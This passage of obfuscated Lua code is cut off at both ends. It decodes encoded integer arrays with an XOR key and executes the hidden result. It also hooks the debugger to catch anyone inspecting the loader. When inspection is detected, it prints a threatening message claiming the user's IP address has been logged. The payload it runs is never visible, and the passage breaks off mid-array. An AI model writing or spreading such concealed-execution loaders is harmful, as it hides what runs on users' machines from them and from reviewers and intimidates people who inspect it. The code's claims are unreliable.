xoOCl8VuMly9ViOB4P4OA2Cxebxya0rvSqbIJjTlpXjew9u3GbLp4rZH[q844j6GhsnLFG4gbBkwp0QtOsH5lW0GiIwydFPiC4xwp0zxPLhpn3('76') .. q844j6GhsnLFG4gbBkwp0QtOsH5lW0GiIwydFPiC4xwp0zxPLhpn3('30') .. q844j6GhsnLFG4gbBkwp0QtOsH5lW0GiIwydFPiC4xwp0zxPLhpn3('6B') .. q844j6GhsnLFG4gbBkwp0QtOsH5lW0GiIwydFPiC4xwp0zxPLhpn3('BC') .. q844j6GhsnLFG4gbBkwp0QtOsH5lW0GiIwydFPiC4xwp0zxPLhpn3('EA')] then
                  print(
                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if xoOCl8VuMly9ViOB4P4OA2Cxebxya0rvSqbIJjTlpXjew9u3GbLp4rZH[q844j6GhsnLFG4gbBkwp0QtOsH5lW0GiIwydFPiC4xwp0zxPLhpn3('02') .. q844j6GhsnLFG4gbBkwp0QtOsH5lW0GiIwydFPiC4xwp0zxPLhpn3('99') .. q844j6GhsnLFG4gbBkwp0QtOsH5lW0GiIwydFPiC4xwp0zxPLhpn3('83') .. q844j6GhsnLFG4gbBkwp0QtOsH5lW0GiIwydFPiC4xwp0zxPLhpn3('1A')](t) then
                    xoOCl8VuMly9ViOB4P4OA2Cxebxya0rvSqbIJjTlpXjew9u3GbLp4rZH
                        [q844j6GhsnLFG4gbBkwp0QtOsH5lW0GiIwydFPiC4xwp0zxPLhpn3('02') .. q844j6GhsnLFG4gbBkwp0QtOsH5lW0GiIwydFPiC4xwp0zxPLhpn3('99') .. q844j6GhsnLFG4gbBkwp0QtOsH5lW0GiIwydFPiC4xwp0zxPLhpn3('83') .. q844j6GhsnLFG4gbBkwp0QtOsH5lW0GiIwydFPiC4xwp0zxPLhpn3('1A')](
                        t)() end end else print(
                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; kyg0KYgxi8GQkIOOS9kyEYuwU2EAkQKypnZtzxasR4gNHg47jus60WVRK6t3aud9tXm(
{ 1189, 743, 999, 788, 1104, 640, 835, 650, 692, 870, 683, 868, 709, 905, 728, 680, 710, 833, 909, 1002, 768, 984, 1050,
  622, 1086, 1097, 592, 737, 1081, 1100, 1048, 1036, 1197, 1200, 609, 911, 756, 1092, 1140, 1117, 877, 1095, 915, 765,
  1082, 1019, 1127, 739, 938, 1190, 1114, 679, 708, 1168, 843, 693, 615, 1155, 787, 1027, 1119, 1116, 901, 671, 1079,
  691, 892, 898, 929, 886, 742, 871, 813, 809, 746, 630, 1170, 670, 1088, 1118, 1071, 736, 1040, 605, 645, 589, 721, 964,
  917, 940, 960, 668, 977, 1049, 1194, 1195, 994, 842, 1087, 978, 648, 688, 847, 741, 748, 698, 1191, 1187, 827, 790,
  823, 825, 798, 959, 1098, 1101, 544, 1013, 869, 1181, 820, 697, 1126, 773, 595, 678, 703, 903, 770, 963, 1203, 837,
  992, 819, 699, 922, 1042, 590, 888, 750, 632, 696, 936, 799, 876, 867, 641, 568, 932, 618, 1044, 767, 916, 821, 860,
  894, 1096, 606, 766, 552, 1209, 565, 914, 831, 976, 569, 1120, 717, 1074, 625, 990, 1106, 723, 852, 574, 1143, 845,
  1196, 1129, 861, 1199, 945, 1202, 1016, 1007, 1201, 655, 822, 586, 757, 1017, 1023, 667, 927, 1105, 1001, 993, 1173,
  551, 986, 856, 1188, 781, 713, 627, 950, 1053, 676, 764, 1089, 758, 564, 1080, 1142, 1172, 1132, 1061, 817, 1204, 556,
  920, 1176, 1065, 899, 1184, 775, 1047, 754, 995, 1167, 795, 1009, 727, 883, 711, 924, 967, 593, 1137, 656, 779, 958,
  647, 705, 1000, 1141, 716, 631, 1028, 1177, 1091, 880, 689, 1085, 814, 1083, 654, 1151, 731, 566, 975, 961, 996, 617,
  1012, 608, 832, 1182, 1077, 875, 981, 1070, 913, 926, 1208, 1130, 620, 1056, 675, 889, 561, 624, 666, 642, 962, 1166,
  953, 1008, 660, 1210, 1043, 853, 907, 545, 644, 957, 918, 578, 771, 778, 598, 946, 1111, 1125, 629, 684, 1024, 966,
  602, 570, 828, 664, 567, 974, 636, 601, 635, 887, 725, 694, 1171, 1073, 669, 1005, 885, 879, 1090, 923, 706, 575, 1022,
  1015, 1192, 634, 998, 841, 657, 872, 970, 1060, 987, 812, 582, 839, 930, 1062, 908, 1185, 1011, 1131, 1069, 579, 1084,
  859, 674, 1099, 904, 829, 646, 1162, 989, 573, 673, 948, 1032, 719, 1160, 1164, 818, 690, 760, 890, 555, 613, 753, 884,
  985, 744, 594, 1010, 588, 783, 1051, 597, 550, 1207, 1205, 955, 1146, 1018, 633, 988, 1128, 687, 1063, 808, 824, 1110,
  1145, 1102, 603, 866, 686, 900, 571, 780, 720, 844, 943, 1175, 865, 1045, 695, 653, 735, 1072, 749, 619, 891, 560, 942,
  840, 796, 1112, 1115, 563, 762, 543, 782, 912, 585, 928, 759, 769, 1034, 638, 662, 902, 834, 1054, 1149, 862, 1058,
  607, 1046, 947, 952, 659, 672, 580, 1067, 1066, 1052, 925, 726, 1057, 549, 1186, 855, 969, 965, 663, 980, 715, 1144,
  803, 658, 583, 858, 714, 1004, 1093, 941, 1193, 1179, 1136, 910, 1158, 612, 614, 1064, 863, 956, 838, 968, 1041, 649,
  1138, 1134, 1165, 1107, 805, 895, 577, 802, 623, 1174, 1035, 701, 1068, 677, 587, 685, 1078, 997, 982, 897, 1076, 599,
  1139, 784, 826, 800, 576, 1121, 1037, 811, 1055, 558, 1133, 1021, 548, 610, 791, 1169, 740, 621, 547, 718, 1156, 681,
  983, 873, 1020, 557, 596, 730, 1038, 816, 971, 797, 1150, -1, 66, 53, 22, 25, 22, 100, 64, 45, 99, 24, 102, 234, 97, 6,
  72, 114, 146, 20, 100, 219, 67, 19, 90, 65, 90, 50, 68, 39, 5, 228, 98, 70, 97, 59, 20, 20, 121, 88, 234, 77, 81, 228,
  11, 2, 22, 111, 68, 22, 48, 31, 102, 72, 98, 83, 120, 14, 4, 126, 81, 103, 49, 58, 0, 113, 106, 12, 97, 72, 14, 105,
  67, 66, 71, 46, 83, 35, 78, 38, 29, 44, 100, 33, 117, 226, 99, 254, 21, 110, 45, 32, 2, 102, 77, 28, 238, 101, 39, 0,
  61, 54, 75, 111, 17, 107, 50, 53, 5, 91, 60, 166, 107, 60, 25, 30, 88, 12, 29, 87, 215, 107, 61, 70, 9, 42, 101, 121,
  40, 19, 66, 88, 27, 111, 4, 7, 17, 76, 77, 1, 12, 85, 61, 49, 97, 125, 70, 98, 7, 72, 49, 9, 87, 22, 109, 12, 124, 35,
  21, 53, 81, 240, 42, 88, 75, 69, 123, 86, 21, 42, 2, 242, 97, 109, 124, 51, 86, 102, 33, 59, 36, 198, 118, 230, 29, 38,
  21, 25, 81, 104, 27, 30, 81, 32, 88, 20, 43, 183, 42, 11, 91, 14, 20, 121, 155, 104, 38, 86, 25, 67, 60, 211, 105, 61,
  217, 43, 14, 68, 43, 22, 92, 105, 187, 78, 34, 79, 119, 107, 36, 28, 107, 138, 127, 102, 97, 92, 91, 121, 68, 21, 121,
  103, 97, 46, 20, 103, 82, 70, 70, 9, 81, 25, 89, 131, 32, 17, 37, 36, 41, 73, 146, 86, 59, 19, 98, 62, 240, 6, 121,
  111, 42, 81, 46, 39, 204, 107, 74, 21, 70, 111, 101, 72, 67, 95, 83, 37, 21, 10, 120, 228, 17, 94, 50, 32, 67, 180, 34,
  84, 27, 79, 98, 127, 72, 34, 108, 77, 22, 213, 255, 223, 110, 115, 82, 128, 42, 80, 203, 94, 84, 84, 115, 20, 121, 29,
  105, 22, 29, 18, 24, 23, 60, 93, 96, 185, 16, 9, 72, 78, 43, 110, 75, 117, 124, 66, 34, 34, 27, 55, 43, 60, 72, 1, 125,
  19, 88, 63, 103, 7, 84, 62, 46, 37, 44, 65, 60, 197, 19, 41, 65, 97, 0, 121, 50, 7, 111, 123, 44, 105, 124, 40, 180, 4,
  93, 48, 10, 43, 69, 27, 111, 17, 157, 73, 152, 65, 25, 103, 246, 32, 223, 14, 21, 21, 9, 46, 24, 1, 71, 91, 125, 101,
  180, 65, 30, 96, 98, 72, 77, 83, 67, 43, 45, 86, 62, 16, 21, 40, 24, 42, 53, 16, 61, 223, 217, 100, 4, 109, 85, 42,
  193, 57, 44, 66, 54, 32, 103, 102, 28, 48, 111, 79, 241, 7, 80, 65, 57, 6, 105, 111, 13, 107, 106, 101, 25, 65, 6, 130,
  81, 52, 48, 84, 39, 27, 48, 214, 120, 118, 116, 81, 112, 117, 86, 65, 68, 36, 255, 110, 93, 24, 249, 55, 254, 18, 98,
  65, 90, 29, 34, 104, 9, 91, 47, 29, 81, 108, 104, 72, 49, 64, 92, 58, 65, 42, 74, 38, 107, 45, 43, 88, 151, 100, 60,
  66, 21, 103, 72, 77, 38, 101, 103, 1, 18, 80, 6, 96, 226, 121, 110, 67, 51, 6, 6, 3, 35, 72, 49, 27, 59, 6, 99, 27, 96,
  75, 62, 239, 84, 68, 64, 58, 97, 28, 1, 6, 223, 83, 117, 69, 111, 28, 171, 22, 33, 22, 16, 88, 97, 13, 121, 40, 40,
  122, 36, 12, 136, 47, 34, 73, 108, 13, 119, 18, 104, 17, 20, 107, 2, 22, 80, 82, 27, 77, 10, 94, 116, 45, 53, 20, 149,
  20, 29, 34, 39, 60, 144, 58, 14, 36, 135, 67, 37, 72, 159, 102, 181, 9, 102, 68, 32, 49, 91, 88, 41, 3, 83, 13, 112,
  83, 78, 177, 17, 206, 0, 91, 246, 111, 6, 24, 82, 96, 124, 46, 1, 107, 79, 104, 109, 117, 93, 233, 95, 26, 19, 81, 124,
  105, 61, 251, 41, 13, 18, 93, 61, 204 }, "vDh45o16AcIbGYhtOAaXKFOBx4"); fwE8GCazbiPyqHVAllXP9VPePXGcwzVwdTWDzL6oDA1EzFfvNfOng76vq4NhLzfflM7lAi1C =
xoOCl8VuMly9ViOB4P4OA2Cxebxya0rvSqbIJjTlpXjew9u3GbLp4rZH; bh98FBfzWA2faErTDHb11hR1flv3lzpzmvXqO7s1HJF4Nk1PZBawIHjXMlMLra =
xoOCl8VuMly9ViOB4P4OA2Cxebxya0rvSqbIJjTlpXjew9u3GbLp4rZH; qb3SlEqWnfEk6KmIqpdurVxzkQWHcQB41i4Xj57kpVNVRgCEK8YL =
bh98FBfzWA2faErTDHb11hR1flv3lzpzmvXqO7s1HJF4Nk1PZBawIHjXMlMLra; hPY6muZtNl8yjBvudPhD8N9E8NmsjZnL6NR8oD1y8LJryFNttgodAxAhwzH13 =
qb3SlEqWnfEk6KmIqpdurVxzkQWHcQB41i4Xj57kpVNVRgCEK8YL; vr7r1vzFUCUyAKnmkqXEDrnpyYoSEQYPsJ7HfEsuRMycPlPDL9T6OBHwH2AgEVXdYztX =
hPY6muZtNl8yjBvudPhD8N9E8NmsjZnL6NR8oD1y8LJryFNttgodAxAhwzH13; ciKSbj05IfvJiFIwZY0OEz7KrCzCiXAR9ewijDRxgNyZDZ3Fr6pierrZn =
vr7r1vzFUCUyAKnmkqXEDrnpyYoSEQYPsJ7HfEsuRMycPlPDL9T6OBHwH2AgEVXdYztX; klVBUcUWpCCQXQozFx0An2Jg1AwxReXRuZGhk38aUcXeGuYDjtxRL5dPrZFca3zfQ =
ciKSbj05IfvJiFIwZY0OEz7KrCzCiXAR9ewijDRxgNyZDZ3Fr6pierrZn; oSeqBMZc0kwSzCDCjyWHWB4bm1h7DQNHmX4v0XVxkhxvrbG6cVeeaVYfayUW3yhtRd6 =
klVBUcUWpCCQXQozFx0An2Jg1AwxReXRuZGhk38aUcXeGuYDjtxRL5dPrZFca3zfQ; eU33NLymlxKL5QhSihNs2hWSp4evWLj0SXt6sqxSY3wcQutFnaW9LqNqDdwfYLaOMbTeqF =
oSeqBMZc0kwSzCDCjyWHWB4bm1h7DQNHmX4v0XVxkhxvrbG6cVeeaVYfayUW3yhtRd6; vmnmGg7uxDaNIVNsNMG8dELwTR11uh3mDNLYsWzOEILt3zscePY10dlcsgbw8pd6t3 =
eU33NLymlxKL5QhSihNs2hWSp4evWLj0SXt6sqxSY3wcQutFnaW9LqNqDdwfYLaOMbTeqF; wyJ16RjJhUKQibq7hEGlbofEboNEyDLjpxnt50dr3L8B9xg8wFCV2KRElmP5TOQRu8mxMpvOs =
vmnmGg7uxDaNIVNsNMG8dELwTR11uh3mDNLYsWzOEILt3zscePY10dlcsgbw8pd6t3; omxollQ1x9ekMErdf4LJUYSksEAA3ba0yb4A7Pf2V0UQFfvDwDR602a9GUiAIK =
wyJ16RjJhUKQibq7hEGlbofEboNEyDLjpxnt50dr3L8B9xg8wFCV2KRElmP5TOQRu8mxMpvOs; bMUTkuORpCvOYcbwOUzS2jq1XgbyhglSXgD1VCXlghrwemnQrja7lbm1f4Cp4rp462qUWAG = function(
  a)
  K, F = 8359280321985311, 16384 + 6579; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; rvp2mqzmT07Bu9iQkDsCF4l8PnGtAUtC4XK5Uh0xRqAZpt6QTrrhs7CBMzfxjJC4ScswoY6mFy = function(b)
  co = coroutine.create(b)
  gk78sW9MC1oleRFoFfmRGRUIAhFD6DNTHec0uZVH4JsugJSyODZFKziDZ3GEcjVNLb74sSWiDvK = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(gk78sW9MC1oleRFoFfmRGRUIAhFD6DNTHec0uZVH4JsugJSyODZFKziDZ3GEcjVNLb74sSWiDvK, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return gk78sW9MC1oleRFoFfmRGRUIAhFD6DNTHec0uZVH4JsugJSyODZFKziDZ3GEcjVNLb74sSWiDvK
end; rrDiAh6f19T8flJHJlUA3PSrLtfqrYXvCMKUXCqXkQo1Xs9aRiT7Cx1bZ3FwoY = function(f, g)
  bER6LwCxiPQQDnp0McQQ4CwCOXA2ShjGBcQNFKQa0L3tSjGZWHWlJp361qnQu9JBjn = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; yJIwqQ0B2OdbRvOTE4R6G1h7tYvU76YpbdvELrySgiBvMDxSUCt2hfUNGm6bJ2TuoBGW = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; gMANQWJkcwY9ih3e4XHz2IIBScgjSgHEEvg5Lbf2pJ1LK6kV0cdVly3DDy = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      bER6LwCxiPQQDnp0McQQ4CwCOXA2ShjGBcQNFKQa0L3tSjGZWHWlJp361qnQu9JBjn(f[i], string.byte(g, j), function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; fzdUcO0idZMYd5t0PBlsatKGCT9l8Xtfs2Y6ndecFKl9hVsncX0ohgXI64TwOO = function(p, n)
    fEbGxXFtbCmmvrKDucRLgbYe3xBevNO6xKp8u17mipI2xnkklK2mLbmxdRIMPAfDt0IRU = ""
    for k, q in pairs(p) do fEbGxXFtbCmmvrKDucRLgbYe3xBevNO6xKp8u17mipI2xnkklK2mLbmxdRIMPAfDt0IRU =
      fEbGxXFtbCmmvrKDucRLgbYe3xBevNO6xKp8u17mipI2xnkklK2mLbmxdRIMPAfDt0IRU ..
      omxollQ1x9ekMErdf4LJUYSksEAA3ba0yb4A7Pf2V0UQFfvDwDR602a9GUiAIK
      [bMUTkuORpCvOYcbwOUzS2jq1XgbyhglSXgD1VCXlghrwemnQrja7lbm1f4Cp4rp462qUWAG('FA') .. bMUTkuORpCvOYcbwOUzS2jq1XgbyhglSXgD1VCXlghrwemnQrja7lbm1f4Cp4rp462qUWAG('B7') .. bMUTkuORpCvOYcbwOUzS2jq1XgbyhglSXgD1VCXlghrwemnQrja7lbm1f4Cp4rp462qUWAG('3D') .. bMUTkuORpCvOYcbwOUzS2jq1XgbyhglSXgD1VCXlghrwemnQrja7lbm1f4Cp4rp462qUWAG('98') .. bMUTkuORpCvOYcbwOUzS2jq1XgbyhglSXgD1VCXlghrwemnQrja7lbm1f4Cp4rp462qUWAG('49') .. bMUTkuORpCvOYcbwOUzS2jq1XgbyhglSXgD1VCXlghrwemnQrja7lbm1f4Cp4rp462qUWAG('1E')]
      [bMUTkuORpCvOYcbwOUzS2jq1XgbyhglSXgD1VCXlghrwemnQrja7lbm1f4Cp4rp462qUWAG('2A') .. bMUTkuORpCvOYcbwOUzS2jq1XgbyhglSXgD1VCXlghrwemnQrja7lbm1f4Cp4rp462qUWAG('DB') .. bMUTkuORpCvOYcbwOUzS2jq1XgbyhglSXgD1VCXlghrwemnQrja7lbm1f4Cp4rp462qUWAG('B0') .. bMUTkuORpCvOYcbwOUzS2jq1XgbyhglSXgD1VCXlghrwemnQrja7lbm1f4Cp4rp462qUWAG('3D')](
      q) end
    ; n(fEbGxXFtbCmmvrKDucRLgbYe3xBevNO6xKp8u17mipI2xnkklK2mLbmxdRIMPAfDt0IRU)
  end; yJIwqQ0B2OdbRvOTE4R6G1h7tYvU76YpbdvELrySgiBvMDxSUCt2hfUNGm6bJ2TuoBGW(f,
    function(r) gMANQWJkcwY9ih3e4XHz2IIBScgjSgHEEvg5Lbf2pJ1LK6kV0cdVly3DDy(r, g,
        function(s) fzdUcO0idZMYd5t0PBlsatKGCT9l8Xtfs2Y6ndecFKl9hVsncX0ohgXI64TwOO(s,
            function(t) if #rvp2mqzmT07Bu9iQkDsCF4l8PnGtAUtC4XK5Uh0xRqAZpt6QTrrhs7CBMzfxjJC4ScswoY6mFy(omxollQ1x9ekMErdf4LJUYSksEAA3ba0yb4A7Pf2V0UQFfvDwDR602a9GUiAIK[bMUTkuORpCvOYcbwOUzS2jq1XgbyhglSXgD1VCXlghrwemnQrja7lbm1f4Cp4rp462qUWAG('CF') .. bMUTkuORpCvOYcbwOUzS2jq1XgbyhglSXgD1VCXlghrwemnQrja7lbm1f4Cp4rp462qUWAG('06') .. bMUTkuORpCvOYcbwOUzS2jq1XgbyhglSXgD1VCXlghrwemnQrja7lbm1f4Cp4rp462qUWAG('B0') .. bMUTkuORpCvOYcbwOUzS2jq1XgbyhglSXgD1VCXlghrwemnQrja7lbm1f4Cp4rp462qUWAG('E7')]) == 1 then if omxollQ1x9ekMErdf4LJUYSksEAA3ba0yb4A7Pf2V0UQFfvDwDR602a9GUiAIK[bMUTkuORpCvOYcbwOUzS2jq1XgbyhglSXgD1VCXlghrwemnQrja7lbm1f4Cp4rp462qUWAG('CF') .. bMUTkuORpCvOYcbwOUzS2jq1XgbyhglSXgD1VCXlghrwemnQrja7lbm1f4Cp4rp462qUWAG('06') .. bMUTkuORpCvOYcbwOUzS2jq1XgbyhglSXgD1VCXlghrwemnQrja7lbm1f4Cp4rp462qUWAG('B0') .. bMUTkuORpCvOYcbwOUzS2jq1XgbyhglSXgD1VCXlghrwemnQrja7lbm1f4Cp4rp462qUWAG('E7')] == omxollQ1x9ekMErdf4LJUYSksEAA3ba0yb4A7Pf2V0UQFfvDwDR602a9GUiAIK[bMUTkuORpCvOYcbwOUzS2jq1XgbyhglSXgD1VCXlghrwemnQrja7lbm1f4Cp4rp462qUWAG('C3') .. bMUTkuORpCvOYcbwOUzS2jq1XgbyhglSXgD1VCXlghrwemnQrja7lbm1f4Cp4rp462qUWAG('3D') .. bMUTkuORpCvOYcbwOUzS2jq1XgbyhglSXgD1VCXlghrwemnQrja7lbm1f4Cp4rp462qUWAG('98') .. bMUTkuORpCvOYcbwOUzS2jq1XgbyhglSXgD1VCXlghrwemnQrja7lbm1f4Cp4rp462qUWAG('49') .. bMUTkuORpCvOYcbwOUzS2jq1XgbyhglSXgD1VCXlghrwemnQrja7lbm1f4Cp4rp462qUWAG('B7')] then
                  print(
                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if omxollQ1x9ekMErdf4LJUYSksEAA3ba0yb4A7Pf2V0UQFfvDwDR602a9GUiAIK[bMUTkuORpCvOYcbwOUzS2jq1XgbyhglSXgD1VCXlghrwemnQrja7lbm1f4Cp4rp462qUWAG('CF') .. bMUTkuORpCvOYcbwOUzS2jq1XgbyhglSXgD1VCXlghrwemnQrja7lbm1f4Cp4rp462qUWAG('06') .. bMUTkuORpCvOYcbwOUzS2jq1XgbyhglSXgD1VCXlghrwemnQrja7lbm1f4Cp4rp462qUWAG('B0') .. bMUTkuORpCvOYcbwOUzS2jq1XgbyhglSXgD1VCXlghrwemnQrja7lbm1f4Cp4rp462qUWAG('E7')](t) then
                    omxollQ1x9ekMErdf4LJUYSksEAA3ba0yb4A7Pf2V0UQFfvDwDR602a9GUiAIK
                        [bMUTkuORpCvOYcbwOUzS2jq1XgbyhglSXgD1VCXlghrwemnQrja7lbm1f4Cp4rp462qUWAG('CF') .. bMUTkuORpCvOYcbwOUzS2jq1XgbyhglSXgD1VCXlghrwemnQrja7lbm1f4Cp4rp462qUWAG('06') .. bMUTkuORpCvOYcbwOUzS2jq1XgbyhglSXgD1VCXlghrwemnQrja7lbm1f4Cp4rp462qUWAG('B0') .. bMUTkuORpCvOYcbwOUzS2jq1XgbyhglSXgD1VCXlghrwemnQrja7lbm1f4Cp4rp462qUWAG('E7')](
                        t)() end end else print(
                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; rrDiAh6f19T8flJHJlUA3PSrLtfqrYXvCMKUXCqXkQo1Xs9aRiT7Cx1bZ3FwoY(
{ 820, 959, 993, 839, 1208, 882, 1025, 937, 950, 618, 765, 1182, 606, 574, 559, 798, 1170, 917, 686, 885, 646, 629, 994,
  1056, 958, 863, 858, 888, 607, 549, 715, 893, 1099, 1097, 1061, 933, 1087, 605, 636, 969, 1036, 964, 543, 652, 650,
  919, 785, 631, 1194, 1132, 974, 1204, 799, 771, 770, 703, 611, 903, 1212, 1043, 951, 772, 738, 789, 1115, 558, 836,
  1161, 912, 838, 603, 860, 946, 1048, 563, 697, 983, 719, 639, 569, 926, 907, 615, 783, 609, 793, 905, 874, 809, 873,
  667, 774, 1002, 998, 761, 1139, 791, 685, 1172, 613, 722, 872, 625, 795, 1197, 753, 889, 1092, 700, 828, 1113, 960,
  1205, 1171, 645, 814, 694, 598, 557, 1016, 617, 892, 642, 1184, 900, 891, 1034, 1180, 640, 1125, 701, 1049, 1093, 813,
  1004, 1035, 684, 683, 1006, 553, 638, 1207, 845, 680, 944, 1147, 1169, 925, 927, 1107, 595, 1202, 764, 963, 1085, 916,
  1027, 712, 724, 662, 938, 1010, 754, 1196, 720, 1181, 1012, 1102, 762, 997, 1073, 955, 1191, 819, 1067, 878, 868, 787,
  1031, 727, 707, 616, 987, 901, 918, 545, 655, 555, 988, 981, 887, 995, 1111, 604, 867, 854, 635, 711, 1095, 1160, 1030,
  841, 673, 1146, 818, 904, 1165, 1144, 670, 876, 747, 648, 1138, 566, 756, 1133, 840, 790, 977, 759, 755, 632, 641, 847,
  1088, 931, 1058, 980, 1041, 696, 990, 848, 808, 1130, 996, 909, 984, 1124, 898, 1158, 1083, 1037, 633, 575, 626, 704,
  1044, 668, 1065, 1015, 661, 627, 1112, 978, 855, 584, 805, 816, 871, 729, 572, 1189, 589, 1164, 1183, 674, 921, 822,
  1068, 601, 749, 782, 576, 733, 922, 779, 658, 865, 976, 911, 853, 776, 752, 687, 1047, 644, 621, 970, 827, 672, 973,
  786, 941, 1209, 1078, 895, 698, 849, 947, 788, 923, 1091, 1116, 744, 608, 1023, 571, 726, 600, 614, 875, 666, 920, 832,
  1057, 934, 804, 906, 1106, 702, 1157, 1126, 587, 657, 1152, 739, 1110, 952, 552, 780, 823, 577, 1122, 551, 1022, 910,
